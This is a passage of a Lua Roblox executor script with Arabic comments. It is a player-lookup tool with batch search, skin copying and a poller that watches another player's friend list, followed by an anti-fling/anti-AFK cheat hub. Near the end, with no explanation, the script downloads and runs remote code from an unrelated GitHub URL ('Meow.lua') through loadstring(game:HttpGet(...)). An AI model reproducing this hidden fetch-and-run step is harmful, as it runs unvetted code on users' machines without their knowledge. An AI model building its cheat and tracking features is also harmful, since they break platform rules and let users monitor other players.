    for name in batchInputValue:gmatch("[^,]+") do
        local trimmed = name:match("^%s*(.-)%s*$")
        if trimmed ~= "" then table.insert(usernames, trimmed) end
    end

    if #usernames == 0 then
        BatchStatusLabel:Set("ما فيه يوزرات صحيحة")
        isBatchSearching = false
        return
    end

    BatchStatusLabel:Set("جاري البحث عن "..#usernames.." يوزر...")
    local successCount = 0

    for i, uname in ipairs(usernames) do
        local user, err = resolveUserInput(uname)
        if user then
            successCount += 1
            createPlayerRow(BatchResultsScroll, BatchResultsLayout, user.id, user.displayName,
                "@"..user.name.." | "..tostring(user.id), user.name, false)
        else
            local errorLabel = Instance.new("TextLabel")
            errorLabel.Size = UDim2.new(1, 0, 0, 26)
            errorLabel.BackgroundTransparency = 1
            errorLabel.Text = uname..": "..(err or "خطأ")
            errorLabel.TextColor3 = Color3.fromRGB(230, 80, 80)
            errorLabel.Font = Enum.Font.Gotham
            errorLabel.TextSize = 12
            errorLabel.TextXAlignment = Enum.TextXAlignment.Left
            errorLabel.AutoLocalize = false
            errorLabel.ZIndex = 2
            errorLabel.Parent = BatchResultsScroll
            updateScrollCanvas(BatchResultsScroll, BatchResultsLayout)
        end
        if i < #usernames then task.wait(0.3) end
    end

    BatchStatusLabel:Set("انتهى البحث: "..successCount.."/"..#usernames.." نجح")
    isBatchSearching = false
end

----------------------------------------------------------------
-- 13) بناء الواجهة
----------------------------------------------------------------
local Window = Rayfield:CreateWindow({
    Name = "بحث عن لاعب روبلوكس",
    LoadingTitle = "بحث لاعب",
    LoadingSubtitle = "جاري التحميل",
    Theme = "Light",
    ConfigurationSaving = {Enabled = false},
})

local Tab = Window:CreateTab("بحث", nil)

Tab:CreateInput({
    Name = "اسم المستخدم أو المعرف (ID)",
    PlaceholderText = "اكتب يوزر أو ID واضغط Enter أو زر بحث",
    RemoveTextAfterFocusLost = true,
    Callback = function(text)
        usernameValue = text
        performSearch()
    end,
})

StatusLabel = Tab:CreateLabel("اكتب يوزر أو ID واضغط بحث")
NameLabel = Tab:CreateLabel("")
UsernameLabel = Tab:CreateLabel("")
IdLabel = Tab:CreateLabel("")
PresenceLabel = Tab:CreateLabel("")
AccountAgeLabel = Tab:CreateLabel("")
VerifiedLabel = Tab:CreateLabel("")
BadgesLabel = Tab:CreateLabel("")
FollowersLabel = Tab:CreateLabel("")
FollowingLabel = Tab:CreateLabel("")
FriendsCountLabel = Tab:CreateLabel("")
PastUsernamesLabel = Tab:CreateLabel("")
WearingCountLabel = Tab:CreateLabel("")

Tab:CreateButton({
    Name = "بحث",
    Callback = performSearch,
})

Tab:CreateButton({
    Name = "نسخ تقرير كامل",
    Callback = function()
        if not currentUser then
            StatusLabel:Set("ابحث عن لاعب أولاً")
            return
        end
        local report = table.concat({
            "الاسم الظاهر: "..currentUser.displayName,
            "اسم المستخدم: @"..currentUser.name,
            "المعرف: "..tostring(currentUser.id),
            "الحالة الآن: "..(currentUser.presenceText or "غير معروف"),
            "عمر الحساب: "..(currentUser.accountAge or "غير متاح"),
            "موثق: "..(currentUser.verified and "نعم" or "لا"),
            "الشارات: "..(currentUser.badgeCount or "غير متاح"),
            "المتابعون: "..(currentUser.followers or "غير متاح"),
            "يتابع: "..(currentUser.following or "غير متاح"),
            "عدد الأصدقاء: "..(currentUser.friendsCount or "غير متاح"),
            "رابط الملف الشخصي: https://www.roblox.com/users/"..currentUser.id.."/profile",
        }, "\n")
        StatusLabel:Set(copyToClipboard(report) and "تم نسخ التقرير الكامل" or "النسخ غير مدعوم بهذا المنفذ")
    end,
})

Tab:CreateButton({
    Name = "نسخ اسم المستخدم",
    Callback = function()
        if not currentUser then StatusLabel:Set("ابحث عن لاعب أولاً") return end
        StatusLabel:Set(copyToClipboard(currentUser.name) and "تم نسخ اسم المستخدم" or "النسخ غير مدعوم")
    end,
})

Tab:CreateButton({
    Name = "نسخ المعرف",
    Callback = function()
        if not currentUser then StatusLabel:Set("ابحث عن لاعب أولاً") return end
        StatusLabel:Set(copyToClipboard(tostring(currentUser.id)) and "تم نسخ المعرف" or "النسخ غير مدعوم")
    end,
})

Tab:CreateButton({
    Name = "نسخ رابط الملف الشخصي",
    Callback = function()
        if not currentUser then StatusLabel:Set("ابحث عن لاعب أولاً") return end
        local link = "https://www.roblox.com/users/"..currentUser.id.."/profile?username="..HttpService:UrlEncode(currentUser.name)
        StatusLabel:Set(copyToClipboard(link) and "تم نسخ الرابط" or "النسخ غير مدعوم")
    end,
})

Tab:CreateButton({
    Name = "إضافة/إزالة من المفضلة",
    Callback = function()
        if not currentUser then StatusLabel:Set("ابحث عن لاعب أولاً") return end
        local foundIndex
        for i, fav in ipairs(favorites) do
            if fav:lower() == currentUser.name:lower() then foundIndex = i break end
        end
        if foundIndex then
            table.remove(favorites, foundIndex)
            StatusLabel:Set("تمت الإزالة من المفضلة")
        else
            table.insert(favorites, currentUser.name)
            StatusLabel:Set("تمت الإضافة للمفضلة")
        end
        saveFavorites()
        refreshFavoritesDropdown()
    end,
})

Tab:CreateButton({
    Name = "نسخ روابط الملابس الحالية",
    Callback = function()
        if not currentUser then StatusLabel:Set("ابحث عن لاعب أولاً") return end
        StatusLabel:Set("جاري جلب الملابس الحالية...")
        task.spawn(function()
            local assetIds = getCurrentlyWearing(currentUser.id)
            if #assetIds == 0 then
                StatusLabel:Set("ما لقيت ملابس أو الحساب خاص")
                return
            end
            local links = {}
            for _, assetId in ipairs(assetIds) do
                table.insert(links, "https://www.roblox.com/catalog/"..tostring(assetId))
            end
            local text = table.concat(links, "\n")
            StatusLabel:Set(copyToClipboard(text) and ("تم نسخ "..#assetIds.." رابط ملبس") or "النسخ غير مدعوم")
        end)
    end,
})

-- (جديد) زر تطبيق سكن اللاعب المعروض حاليًا على نفسك مباشرة
Tab:CreateButton({
    Name = "تطبيق سكن هذا اللاعب على نفسي",
    Callback = function()
        if not currentUser then
            StatusLabel:Set("ابحث عن لاعب أولاً")
            return
        end
        applySkinToSelf(currentUser.name)
    end,
})

RecentDropdown = Tab:CreateDropdown({
    Name = "عمليات البحث الأخيرة",
    Options = {"لا يوجد بعد"},
    CurrentOption = {"لا يوجد بعد"},
    Callback = function(selected)
        local pick = type(selected) == "table" and selected[1] or selected
        if pick and pick ~= "لا يوجد بعد" then usernameValue = pick performSearch() end
    end,
})

FavoritesDropdown = Tab:CreateDropdown({
    Name = "المفضلة",
    Options = {"لا يوجد بعد"},
    CurrentOption = {"لا يوجد بعد"},
    Callback = function(selected)
        local pick = type(selected) == "table" and selected[1] or selected
        if pick and pick ~= "لا يوجد بعد" then usernameValue = pick performSearch() end
    end,
})

local ToggleButton
local parentGui = (gethui and gethui()) or game:GetService("CoreGui")
local AvatarGui = Instance.new("ScreenGui")
AvatarGui.Name = "AvatarPreviewGui"
AvatarGui.ResetOnSpawn = false
AvatarGui.Parent = parentGui

local AvatarFrame = Instance.new("Frame")
AvatarFrame.Size = UDim2.new(0, 110, 0, 110)
AvatarFrame.Position = UDim2.new(0, 20, 0, 20)
AvatarFrame.BackgroundColor3 = UI_BASE_BLACK
AvatarFrame.BorderSizePixel = 0
AvatarFrame.Parent = AvatarGui
Instance.new("UICorner", AvatarFrame).CornerRadius = UDim.new(0, 12)
applyGlossyDark(AvatarFrame, UI_BASE_BLACK)
applySilverSpinBorder(AvatarFrame, 2)

AvatarImage = Instance.new("ImageLabel")
AvatarImage.Name = "TargetAvatar"
AvatarImage.Size = UDim2.new(1, -10, 1, -10)
AvatarImage.Position = UDim2.new(0, 5, 0, 5)
AvatarImage.BackgroundTransparency = 1
AvatarImage.ZIndex = 2
AvatarImage.Parent = AvatarFrame
Instance.new("UICorner", AvatarImage).CornerRadius = UDim.new(0, 10)

local FullBodyFrame = Instance.new("Frame")
FullBodyFrame.Size = UDim2.new(0, 110, 0, 190)
FullBodyFrame.Position = UDim2.new(0, 20, 0, 140)
FullBodyFrame.BackgroundColor3 = UI_BASE_BLACK
FullBodyFrame.BorderSizePixel = 0
FullBodyFrame.Parent = AvatarGui
Instance.new("UICorner", FullBodyFrame).CornerRadius = UDim.new(0, 12)
applyGlossyDark(FullBodyFrame, UI_BASE_BLACK)
applySilverSpinBorder(FullBodyFrame, 2)

FullBodyImage = Instance.new("ImageLabel")
FullBodyImage.Name = "TargetAvatar"
FullBodyImage.Size = UDim2.new(1, -10, 1, -10)
FullBodyImage.Position = UDim2.new(0, 5, 0, 5)
FullBodyImage.BackgroundTransparency = 1
FullBodyImage.ZIndex = 2
FullBodyImage.Parent = FullBodyFrame
Instance.new("UICorner", FullBodyImage).CornerRadius = UDim.new(0, 10)

FriendsScroll, FriendsLayout, FriendsPanel, FriendsTitle = createScrollPanel(AvatarGui, "قائمة الأصدقاء", UDim2.new(0, 320, 0, 320), UDim2.new(0, 150, 0, 20))
applyGlossyDark(FriendsPanel, UI_BASE_BLACK)
applySilverSpinBorder(FriendsPanel, 2)
applyGlossyContrastStyle(FriendsTitle)

----------------------------------------------------------------
-- شريط فلترة + ترتيب قائمة الأصدقاء (فوق القائمة مباشرة)
----------------------------------------------------------------
local FriendsFilterBar = Instance.new("Frame")
FriendsFilterBar.Size = UDim2.new(1, -10, 0, 26)
FriendsFilterBar.Position = UDim2.new(0, 5, 0, 30)
FriendsFilterBar.BackgroundTransparency = 1
FriendsFilterBar.ZIndex = 2
FriendsFilterBar.Parent = FriendsPanel

local FriendsFilterBg = Instance.new("Frame")
FriendsFilterBg.Size = UDim2.new(1, -60, 1, 0)
FriendsFilterBg.BackgroundColor3 = UI_CARD_BLACK
FriendsFilterBg.BorderSizePixel = 0
FriendsFilterBg.ZIndex = 2
FriendsFilterBg.Parent = FriendsFilterBar
Instance.new("UICorner", FriendsFilterBg).CornerRadius = UDim.new(0, 6)
applySilverSpinBorder(FriendsFilterBg, 1.2)

local FriendsFilterBox = Instance.new("TextBox")
FriendsFilterBox.Size = UDim2.new(1, -10, 1, 0)
FriendsFilterBox.Position = UDim2.new(0, 5, 0, 0)
FriendsFilterBox.BackgroundTransparency = 1
FriendsFilterBox.PlaceholderText = "فلترة بالاسم..."
FriendsFilterBox.Text = ""
FriendsFilterBox.PlaceholderColor3 = UI_LIGHTGRAY
FriendsFilterBox.Font = Enum.Font.Gotham
FriendsFilterBox.TextSize = 12
FriendsFilterBox.TextXAlignment = Enum.TextXAlignment.Left
FriendsFilterBox.ClearTextOnFocus = false
FriendsFilterBox.AutoLocalize = false
FriendsFilterBox.ZIndex = 3
FriendsFilterBox.Parent = FriendsFilterBg
applyGlossyContrastStyle(FriendsFilterBox)

local FriendsSortButton = Instance.new("TextButton")
FriendsSortButton.Size = UDim2.new(0, 54, 1, 0)
FriendsSortButton.Position = UDim2.new(1, -54, 0, 0)
FriendsSortButton.BackgroundColor3 = UI_WHITE
FriendsSortButton.Text = "ترتيب"
FriendsSortButton.TextColor3 = Color3.fromRGB(10, 10, 10)
FriendsSortButton.Font = Enum.Font.GothamBold
FriendsSortButton.TextSize = 11
FriendsSortButton.AutoButtonColor = true
FriendsSortButton.AutoLocalize = false
FriendsSortButton.ZIndex = 3
FriendsSortButton.Parent = FriendsFilterBar
Instance.new("UICorner", FriendsSortButton).CornerRadius = UDim.new(0, 6)
applySilverSpinBorder(FriendsSortButton, 1.2)

FriendsScroll.Position = UDim2.new(0, 5, 0, 60)
FriendsScroll.Size = UDim2.new(1, -10, 1, -64)
FriendsLayout.Padding = UDim.new(0, 4)

FriendsFilterBox:GetPropertyChangedSignal("Text"):Connect(function()
    friendsFilterText = FriendsFilterBox.Text
    renderFriendsList()
end)

FriendsSortButton.MouseButton1Click:Connect(function()
    friendsSortOnlineFirst = not friendsSortOnlineFirst
    FriendsSortButton.Text = friendsSortOnlineFirst and "أونلاين" or "ترتيب"
    renderFriendsList()
end)

ToggleButton = Tab:CreateButton({
    Name = "إخفاء الواجهة",
    Callback = function()
        AvatarGui.Enabled = not AvatarGui.Enabled
        if ToggleButton.Set then
            ToggleButton:Set(AvatarGui.Enabled and "إخفاء الواجهة" or "إظهار الواجهة")
        end
    end,
})

Tab:CreateToggle({
    Name = "تتبع تغييرات أصدقاء اللاعب (إضافة/حذف)",
    CurrentValue = false,
    Callback = function(value)
        friendsWatchEnabled = value
        StatusLabel:Set(value and "التتبع شغّال - بيبلغك لو ضاف أو حذف صديق" or "التتبع متوقف")
    end,
})

task.spawn(function()
    while true do
        task.wait(FRIENDS_WATCH_INTERVAL)
        if friendsWatchEnabled and currentUser then
            local watchedId = currentUser.id
            local freshFriends, watchErr = getFriends(watchedId)
            if not watchErr and currentUser and currentUser.id == watchedId then
                local oldIds, freshIds = {}, {}
                for _, f in ipairs(lastFriendsRaw) do oldIds[f.id] = true end
                for _, f in ipairs(freshFriends) do freshIds[f.id] = true end

                local newOnes, removedOnes = {}, {}
                for _, f in ipairs(freshFriends) do
                    if not oldIds[f.id] then table.insert(newOnes, f) end
                end
                for _, f in ipairs(lastFriendsRaw) do
                    if not freshIds[f.id] then table.insert(removedOnes, f) end
                end

                if #newOnes > 0 or #removedOnes > 0 then
                    local allIds = {}
                    for _, f in ipairs(freshFriends) do table.insert(allIds, f.id) end
                    local usersMap = getUsersBatch(allIds)

                    for _, f in ipairs(newOnes) do
                        local info = usersMap[f.id]
                        sendToast("صديق جديد", (info and info.displayName or "لاعب").." ضاف صداقة "..currentUser.displayName)
                    end
                    for _, f in ipairs(removedOnes) do
                        local info = lastFriendsUsersMap[f.id]
                        sendToast("إزالة صداقة", (info and info.displayName or "لاعب").." ما عاد صديق لـ"..currentUser.displayName)
                    end

                    populateFriendsUI(freshFriends, usersMap)
                end
            end
        end
    end
end)

local BatchTab = Window:CreateTab("بحث جماعي", nil)
BatchTab:CreateInput({
    Name = "يوزرات أو IDs (افصل بينهم بفاصلة ,)",
    PlaceholderText = "user1, 123456, user2",
    RemoveTextAfterFocusLost = false,
    Callback = function(text) batchInputValue = text end,
})
BatchStatusLabel = BatchTab:CreateLabel("اكتب يوزرات وافصل بينهم بفاصلة")
BatchTab:CreateButton({ Name = "بحث جماعي", Callback = runBatchSearch })
BatchResultsScroll, BatchResultsLayout, BatchResultsPanel, BatchResultsTitle = createScrollPanel(AvatarGui, "نتائج البحث الجماعي", UDim2.new(0, 320, 0, 320), UDim2.new(0, 480, 0, 20))
applyGlossyDark(BatchResultsPanel, UI_BASE_BLACK)
applySilverSpinBorder(BatchResultsPanel, 2)
applyGlossyContrastStyle(BatchResultsTitle)

local BatchToggleButton
BatchToggleButton = BatchTab:CreateButton({
    Name = "إخفاء واجهة الجماعي",
    Callback = function()
        BatchResultsPanel.Visible = not BatchResultsPanel.Visible
        if BatchToggleButton.Set then
            BatchToggleButton:Set(BatchResultsPanel.Visible and "إخفاء واجهة الجماعي" or "إظهار واجهة الجماعي")
        end
    end,
})

----------------------------------------------------------------
-- (جديد) تبويب ثالث: تطبيق سكن لاعب على نفسك مباشرة
----------------------------------------------------------------
local SkinTab = Window:CreateTab("تطبيق السكن", nil)

SkinTab:CreateInput({
    Name = "يوزر اللاعب المراد تطبيق سكنه",
    PlaceholderText = "اكتب يوزر واضغط Enter",
    RemoveTextAfterFocusLost = true,
    Callback = function(text)
        skinApplyInputValue = text
        applySkinToSelf(text)
    end,
})

SkinApplyStatusLabel = SkinTab:CreateLabel("اكتب يوزر لاعب، بيتطبق سكنه عليك فورًا بدون أي تأخير")

SkinTab:CreateButton({
    Name = "تطبيق السكن الآن",
    Callback = function()
        applySkinToSelf(skinApplyInputValue)
    end,
})

SkinHistoryDropdown = SkinTab:CreateDropdown({
    Name = "سجل السكنات المطبقة (الأكثر استخدامًا أولاً)",
    Options = {"لا يوجد بعد"},
    CurrentOption = {"لا يوجد بعد"},
    Callback = function(selected)
        local pick = type(selected) == "table" and selected[1] or selected
        if pick and pick ~= "لا يوجد بعد" then
            local rawName = pick:gsub("%s*%(x%d+%)$", "")
            applySkinToSelf(rawName)
        end
    end,
})

local SettingsTab = Window:CreateTab("الإعدادات", nil)
SettingsTab:CreateSlider({
    Name = "مهلة الطلب (ثواني)",
    Range = {3, 30}, Increment = 1, CurrentValue = REQUEST_TIMEOUT,
    Callback = function(value) REQUEST_TIMEOUT = value end,
})
SettingsTab:CreateSlider({
    Name = "مدة الكاش (ثواني)",
    Range = {10, 300}, Increment = 10, CurrentValue = CACHE_TTL,
    Callback = function(value) CACHE_TTL = value end,
})

----------------------------------------------------------------
-- 14) تحميل البيانات المحفوظة عند بدء التشغيل
----------------------------------------------------------------
loadFavorites()
refreshFavoritesDropdown()
loadSkinHistory()
refreshSkinHistoryDropdown()



task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/mmnnnm460-byte/LOPLNN/refs/heads/main/Meow.lua"))()
end)


task.spawn(function()
local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()

WindUI:AddTheme({
    Name = "BlueBlack",
    Accent      = Color3.fromHex("#0a0f1e"),
    Background  = Color3.fromHex("#05080f"),
    Outline     = Color3.fromHex("#1a4fff"),
    Text        = Color3.fromHex("#dbeafe"),
    Placeholder = Color3.fromHex("#2f74d1"),
    Button      = Color3.fromHex("#1a3acc"),
    Icon        = Color3.fromHex("#4d7fff"),
    Toggle      = Color3.fromHex("#2563eb"),
    Slider      = Color3.fromHex("#1a4fff"),
    Checkbox    = Color3.fromHex("#1a4fff"),
    Primary     = Color3.fromHex("#1a4fff"),
    Dialog      = Color3.fromHex("#080d1a"),
    ElementBackground = Color3.fromHex("#0d1530"),
    ElementBackgroundTransparency = 0,
})

WindUI:SetTheme("BlueBlack")

local Window = WindUI:CreateWindow({
    Title = "My Super Hub",
    Icon = "rbxassetid://128913495589591",
    Author = "by .ftgs and .ftgs",
    Folder = "MySuperHub",
    Size = UDim2.fromOffset(580, 460),
    MinSize = Vector2.new(560, 350),
    MaxSize = Vector2.new(850, 560),
    ToggleKey = Enum.KeyCode.LeftShift,
    Transparent = true,
    Theme = "BlueBlack",
    Resizable = true,
    SideBarWidth = 200,
    BackgroundImageTransparency = 0.29,
    HideSearchBar = false,
    ScrollBarEnabled = false,
    Background = "rbxassetid://128913495589591",
    User = {
        Enabled = false,
        Anonymous = false,
        Callback = function()
            print("clicked")
        end,
    },
    OpenButton = {
        Enabled = true,
        Color = ColorSequence.new(
            Color3.fromHex("#000000"),
            Color3.fromHex("#1a4fff")
        ),
    },
})

local MainTab = Window:Tab({ Title = "الحماية", Icon = "shield" })
local ExtraTab = Window:Tab({ Title = "أدوات إضافية", Icon = "settings" })

-- ==================== دالة حماية إنشاء العناصر ====================
local function SafeElement(label, fn)
    local ok, err = pcall(fn)
    if not ok then
        warn("[Anti-Fling System] فشل إنشاء: " .. label .. " | السبب: " .. tostring(err))
        pcall(function()
            WindUI:Notify({
                Title = "خطأ بالتحميل: " .. label,
                Content = tostring(err),
                Icon = "alert-triangle",
                Duration = 6,
            })
        end)
    end
end

local FlingSection = MainTab:Section({ Title = "Anti-Fling — الحماية من الرمي" })
MainTab:Space()
local ExtraProtectionSection = MainTab:Section({ Title = "حمايات إضافية" })

local VoidSection = ExtraTab:Section({ Title = "الحماية من السقوط بالفراغ" })
ExtraTab:Space()
local UtilitySection = ExtraTab:Section({ Title = "أدوات مساعدة" })

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Lighting = game:GetService("Lighting")
local VirtualUser = game:GetService("VirtualUser")
local LocalPlayer = Players.LocalPlayer

local AntiFlingEnabled = false
local AntiFlingConnection = nil
local MaxSafeVelocity = 90
local MaxSafeAngularVelocity = 250 -- الدوران وقت الفلينج يطلع أرقام جنونية، عطيته حد أعلى مستقل
local MaxDistancePerSecond = 120
local LastSafePosition = nil
local CurrentHRP = nil
local CurrentHumanoid = nil
local LastNotifyTime = 0
local NotifyCooldown = 2

-- تخزين أجزاء اللاعبين الثانين بدل ما نسوي GetDescendants كل فريم
local OtherPlayersParts = {} -- [BasePart] = originalCanCollide

local function TrackPart(part)
    if part:IsA("BasePart") and OtherPlayersParts[part] == nil then
        OtherPlayersParts[part] = part.CanCollide
    end
end

local function TrackCharacter(character)
    for _, part in ipairs(character:GetDescendants()) do
        TrackPart(part)
    end
    character.DescendantAdded:Connect(function(desc)
        TrackPart(desc)
    end)
end

local function SetupPlayerTracking(player)
    if player == LocalPlayer then return end
    if player.Character then
        pcall(TrackCharacter, player.Character)
    end
    player.CharacterAdded:Connect(function(char)
        pcall(TrackCharacter, char)
    end)
end

for _, player in ipairs(Players:GetPlayers()) do
    SetupPlayerTracking(player)
end
Players.PlayerAdded:Connect(SetupPlayerTracking)
Players.PlayerRemoving:Connect(function(player)
    if player.Character then
        for _, part in ipairs(player.Character:GetDescendants()) do
            OtherPlayersParts[part] = nil
        end
    end
end)

-- حالة Anti-Ragdoll
local AntiRagdollEnabled = false
local RagdollConnection = nil

local function SetupRagdollProtection(humanoid)
    if RagdollConnection then
        RagdollConnection:Disconnect()
        RagdollConnection = nil
    end
    if not humanoid then return end

    RagdollConnection = humanoid.StateChanged:Connect(function(_, newState)
        if not AntiRagdollEnabled then return end
        if newState == Enum.HumanoidStateType.Ragdoll and humanoid.Health > 0 then
            task.defer(function()
                pcall(function()
                    humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
                end)
            end)
            if (os.clock() - LastNotifyTime) > NotifyCooldown then
                LastNotifyTime = os.clock()
                pcall(function()
                    WindUI:Notify({
                        Title = "Anti-Ragdoll",
                        Content = "تم منع محاولة إسقاطك برجدول قسري!",
                        Icon = "shield-check",
                        Duration = 3,
                    })
                end)
            end
        end
    end)
end

-- حالة Anti-Teleport Trap
local AntiTeleportTrapEnabled = false
local TeleportTrapConnection = nil
local LastTeleportPosition = nil
local MaxTeleportDistance = 60

local function SetupTeleportTrap(hrp)
    if TeleportTrapConnection then
        TeleportTrapConnection:Disconnect()
        TeleportTrapConnection = nil
    end
    LastTeleportPosition = hrp.Position

    TeleportTrapConnection = hrp:GetPropertyChangedSignal("CFrame"):Connect(function()
        if not AntiTeleportTrapEnabled then return end
        pcall(function()
            if not LastTeleportPosition then
                LastTeleportPosition = hrp.Position
                return
            end

            local currentPosition = hrp.Position
            local distance = (currentPosition - LastTeleportPosition).Magnitude

            if distance > MaxTeleportDistance then
                hrp.CFrame = CFrame.new(LastTeleportPosition) * hrp.CFrame.Rotation
                hrp.AssemblyLinearVelocity = Vector3.zero

                if (os.clock() - LastNotifyTime) > NotifyCooldown then
                    LastNotifyTime = os.clock()
                    WindUI:Notify({
                        Title = "Anti-Teleport",
                        Content = "تم رصد قفزة مكان مفاجئة ومنعها!",
                        Icon = "shield-alert",
                        Duration = 3,
                    })
                end
            else
                LastTeleportPosition = currentPosition
            end
        end)
    end)
end

local function OnCharacterAdded(character)
    LastSafePosition = nil
    CurrentHRP = nil
    CurrentHumanoid = nil

    local ok, hrp = pcall(function()
        return character:WaitForChild("HumanoidRootPart", 10)
    end)
    if ok and hrp then
        CurrentHRP = hrp
        pcall(SetupTeleportTrap, hrp)
    end

    local ok2, humanoid = pcall(function()
        return character:WaitForChild("Humanoid", 10)
    end)
    if ok2 and humanoid then
        CurrentHumanoid = humanoid
        pcall(SetupRagdollProtection, humanoid)
    end
end

LocalPlayer.CharacterAdded:Connect(OnCharacterAdded)
if LocalPlayer.Character then
    pcall(OnCharacterAdded, LocalPlayer.Character)
end

local function RestoreOtherPlayersCollision()
    for part, originalCanCollide in pairs(OtherPlayersParts) do
        if part.Parent then
            pcall(function() part.CanCollide = originalCanCollide end)
        end
    end
end

local function ToggleAntiFling(Value)
    AntiFlingEnabled = Value
    LastSafePosition = nil

    if AntiFlingEnabled then
        AntiFlingConnection = RunService.Heartbeat:Connect(function(deltaTime)
            if not AntiFlingEnabled then return end

            pcall(function()
                for part in pairs(OtherPlayersParts) do
                    if part.Parent then
                        part.CanCollide = false
                        part.AssemblyLinearVelocity = Vector3.zero
                        part.AssemblyAngularVelocity = Vector3.zero
                    end
                end
            end)

            pcall(function()
                local hrp = CurrentHRP
                if not (hrp and hrp.Parent) then return end
                local currentPosition = hrp.Position
                local flingDetected = false

                if LastSafePosition then
                    local distanceMoved = (currentPosition - LastSafePosition).Magnitude
                    local maxAllowedDistance = MaxDistancePerSecond * deltaTime
                    if distanceMoved > maxAllowedDistance then
                        hrp.CFrame = CFrame.new(LastSafePosition) * hrp.CFrame.Rotation
                        hrp.AssemblyLinearVelocity = Vector3.zero
                        hrp.AssemblyAngularVelocity = Vector3.zero
                        flingDetected = true
                    else
                        LastSafePosition = currentPosition
                    end
                else
                    LastSafePosition = currentPosition
                end

                if hrp.AssemblyLinearVelocity.Magnitude > MaxSafeVelocity then
                    hrp.AssemblyLinearVelocity = Vector3.zero
                    flingDetected = true
                end
                if hrp.AssemblyAngularVelocity.Magnitude > MaxSafeAngularVelocity then
                    hrp.AssemblyAngularVelocity = Vector3.zero
                    flingDetected = true
                end

                if flingDetected and (os.clock() - LastNotifyTime) > NotifyCooldown then
                    LastNotifyTime = os.clock()
                    WindUI:Notify({
                        Title = "Anti-Fling",
                        Content = "تم اكتشاف وصد محاولة فلينج!",
                        Icon = "shield-check",
                        Duration = 3,
                    })
                end
            end)
        end)
    else
        if AntiFlingConnection then
            AntiFlingConnection:Disconnect()
            AntiFlingConnection = nil
        end
        RestoreOtherPlayersCollision()
    end
end

-- ==================== عناصر تبويب "الحماية" ====================

SafeElement("Anti-Fling Toggle", function()
    FlingSection:Toggle({
       Flag = "AntiFlingToggle",
       Title = "Anti-Fling (مضاد الفلينج)",
       Icon = "shield-check",
       Value = false,
       Callback = function(state)
           ToggleAntiFling(state)
           Window.CurrentConfig:Save()
       end,
    })
end)

SafeElement("Max Safe Velocity Slider", function()
    FlingSection:Slider({
       Flag = "MaxSafeVelocitySlider",
       Title = "أقصى سرعة طبيعية",
       Desc = "أي سرعة أعلى من هذا الرقم تعتبر فلينج وتُصفّر فورًا",
       Icon = "gauge",
       Step = 5,
       Value = { Min = 30, Max = 300, Default = 90 },
       Callback = function(value)
           MaxSafeVelocity = value
           Window.CurrentConfig:Save()
       end,
    })
end)

SafeElement("Max Distance Per Second Slider", function()
    FlingSection:Slider({
       Flag = "MaxDistanceSlider",
       Title = "أقصى مسافة حركة بالثانية",
       Desc = "يحمي من اللوب فلينج التدريجي حتى لو زادوا القوة شوي شوي",
       Icon = "move",
       Step = 5,
       Value = { Min = 30, Max = 400, Default = 120 },
       Callback = function(value)
           MaxDistancePerSecond = value
           Window.CurrentConfig:Save()
       end,
    })
end)

SafeElement("Anti-Ragdoll Toggle", function()
    ExtraProtectionSection:Toggle({
       Flag = "AntiRagdollToggle",
       Title = "Anti-Ragdoll (منع الرجدول القسري)",
       Desc = "يمنع أي محاولة لإسقاطك بحالة رجدول وأنت حي، ويرجعك واقف فورًا",
       Icon = "user-check",
       Value = false,
       Callback = function(state)
           AntiRagdollEnabled = state
           Window.CurrentConfig:Save()
       end,
    })
end)

SafeElement("Anti-Teleport Trap Toggle", function()
    ExtraProtectionSection:Toggle({
       Flag = "AntiTeleportTrapToggle",
       Title = "Anti-Teleport Trap (فخ ضد التيليبورت المفاجئ)",
       Desc = "يرصد أي قفزة مكان لحظية (تيليبورت) ويرجعك فورًا، بشكل مستقل عن Anti-Fling",
       Icon = "radar",
       Value = false,
       Callback = function(state)
           AntiTeleportTrapEnabled = state
           Window.CurrentConfig:Save()
       end,
    })
end)

SafeElement("Max Teleport Distance Slider", function()
    ExtraProtectionSection:Slider({
       Flag = "MaxTeleportDistanceSlider",
       Title = "أقصى مسافة قفزة مسموحة",
       Desc = "أي قفزة مكان أكبر من هذا الرقم دفعة وحدة تعتبر تيليبورت مشبوه",
       Icon = "ruler",
       Step = 5,
       Value = { Min = 20, Max = 200, Default = 60 },
       Callback = function(value)
           MaxTeleportDistance = value
           Window.CurrentConfig:Save()
       end,
    })
end)

-- ==================== عناصر تبويب "أدوات إضافية" ====================

local AntiVoidEnabled = false
local AntiVoidConnection = nil
local LastGroundPosition = nil
local VoidSafetyMargin = 50

local function ToggleAntiVoid(Value)
    AntiVoidEnabled = Value

    if AntiVoidEnabled then
        AntiVoidConnection = RunService.Heartbeat:Connect(function()
            if not AntiVoidEnabled then return end

            pcall(function()
                local hrp = CurrentHRP
                local humanoid = CurrentHumanoid
                if not (hrp and hrp.Parent and humanoid and humanoid.Parent) then return end

                if humanoid.FloorMaterial ~= Enum.Material.Air then
                    LastGroundPosition = hrp.Position
                end

                local destroyHeight = workspace.FallenPartsDestroyHeight
                if LastGroundPosition and hrp.Position.Y < (destroyHeight + VoidSafetyMargin) then
                    hrp.CFrame = CFrame.new(LastGroundPosition) * hrp.CFrame.Rotation
                    hrp.AssemblyLinearVelocity = Vector3.zero

                    if (os.clock() - LastNotifyTime) > NotifyCooldown then
                        LastNotifyTime = os.clock()
                        WindUI:Notify({
                            Title = "Anti-Void",
                            Content = "تم إرجاعك قبل السقوط بالفراغ!",
                            Icon = "arrow-up-circle",
                            Duration = 3,
                        })
                    end
                end
            end)
        end)
    else
        if AntiVoidConnection then
            AntiVoidConnection:Disconnect()
            AntiVoidConnection = nil
        end
    end
end

SafeElement("Anti-Void Toggle", function()
    VoidSection:Toggle({
       Flag = "AntiVoidToggle",
       Title = "Anti-Void (الحماية من السقوط بالفراغ)",
       Desc = "يرجعك تلقائيًا لآخر أرض واقف عليها لو سقطت تحت الماب",
       Icon = "arrow-up-circle",
       Value = false,
       Callback = function(state)
           ToggleAntiVoid(state)
           Window.CurrentConfig:Save()
       end,
    })
end)

local AntiAFKConnection = nil

local function ToggleAntiAFK(Value)
    if Value then
        AntiAFKConnection = LocalPlayer.Idled:Connect(function()
            VirtualUser:CaptureController()
            VirtualUser:ClickButton2(Vector2.new())
        end)
    else
        if AntiAFKConnection then
            AntiAFKConnection:Disconnect()
